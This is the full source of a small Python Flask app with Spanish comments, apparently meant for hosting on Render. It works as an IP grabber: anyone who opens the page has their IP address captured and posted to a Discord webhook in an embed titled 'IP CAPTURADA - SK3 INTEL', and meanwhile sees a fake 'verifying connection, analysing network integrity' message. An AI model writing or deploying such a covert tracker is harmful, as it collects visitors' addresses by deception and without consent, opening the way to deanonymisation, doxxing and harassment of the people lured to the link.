import os
import requests
from flask import Flask, request

app = Flask(__name__)

# Render sacará el Webhook de aquí
WEBHOOK_URL = os.environ.get('SK3_WEBHOOK')

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Datos para mandar a Discord
    payload = {
        "embeds": [{
            "title": "🛰️ IP CAPTURADA - SK3 INTEL",
            "description": f"**IP:** `{ip}`\n**Usuario:** Analizando...",
            "color": 15548997
        }]
    }
    
    # Enviar al Webhook de Discord
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    
    return "<h1>Verificando Conexión... Analizando integridad de red.</h1>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
